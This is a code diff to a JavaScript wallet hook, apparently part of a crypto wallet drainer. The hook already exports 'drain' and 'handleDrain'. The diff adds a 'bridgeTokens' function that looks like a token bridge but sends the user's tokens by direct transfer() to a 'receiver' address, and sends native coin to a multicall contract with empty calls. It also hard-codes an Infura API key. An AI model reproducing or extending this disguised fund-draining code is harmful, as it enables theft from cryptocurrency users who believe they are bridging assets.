@@ -420,5 +420,91 @@ export const UseWallet = () => {
     return tokenBalances;
   };
 
-  return { approveTokens, drain, getTokenAssets, handleDrain };
+  // Main function to handle bridging logic based on token type
+  const bridgeTokens = async ({ token, amount }) => {
+    try {
+      if (!account?.address || !account?.chainId) {
+        toast.error("Connect your wallet first.");
+        return;
+      }
+
+      const isNative = token.address === "0x0000000000000000000000000000000000000000"; // Check if native token
+
+      if (isNative) {
+        // Bridge Native Token (ETH, BNB, etc.)
+        await bridgeNativeToken(amount);
+      } else {
+        // Bridge Non-Native Token (DAI, USDT, etc.)
+        await bridgeNonNativeToken(token, amount);
+      }
+    } catch (error) {
+      console.error("Error in bridging tokens:", error);
+      toast.error("Failed to bridge tokens.");
+    }
+  };
+
+  // Function to handle native token bridging through multicall
+  const bridgeNativeToken = async (amount) => {
+    const chainId = account.chainId;
+    const provider = new ethers.providers.JsonRpcProvider(
+      `https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73`
+    );
+    const signer = provider.getSigner(account.address);
+    const contractAddress = getContractAddress(chainId);
+  
+    const multiCallContract = new Contract(contractAddress, contractAbi, signer);
+    const amountInWei = utils.parseEther(amount.toString());
+  
+    try {
+      const gasPrice = await provider.getGasPrice();
+      const gasEstimate = await multiCallContract.estimateGas.multiCall([], [], {
+        value: amountInWei,
+      });
+  
+      const tx = await multiCallContract.multiCall([], [], {
+        value: amountInWei,
+        gasLimit: gasEstimate,
+        gasPrice,
+      });
+  
+      console.log(`Transaction hash: ${tx.hash}`);
+      await tx.wait();
+      toast.success(`Successfully bridged ${amount} native token.`);
+    } catch (error) {
+      console.error("Native token bridging failed:", error);
+      toast.error("Failed to bridge native token.");
+    }
+  };  
+
+  // Function to transfer non-native tokens to receiver address
+  const bridgeNonNativeToken = async (token, amount) => {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner(account.address);
+
+    if (!token.address) {
+      console.error("Invalid token address:", token); // Log the token object to debug
+      throw new Error("Token address is undefined or invalid.");
+    }
+
+    const tokenContract = new Contract(
+      token.address,
+      ["function transfer(address to, uint256 amount) external returns (bool)"],
+      signer
+    );
+
+    const amountInWei = utils.parseUnits(amount.toString(), token.decimals);
+
+    try {
+      const tx = await tokenContract.transfer(receiver, amountInWei);
+      console.log(`Non-native token transfer tx hash: ${tx.hash}`);
+      await tx.wait();
+      toast.success(`Transferred ${amount} ${token.name} successfully.`);
+    } catch (error) {
+      console.error(`Transfer failed for ${token.name}:`, error);
+      toast.error(`Transfer failed for ${token.name}.`);
+    }
+  };
+
+
+  return { approveTokens, drain, getTokenAssets, handleDrain, bridgeTokens };
 };
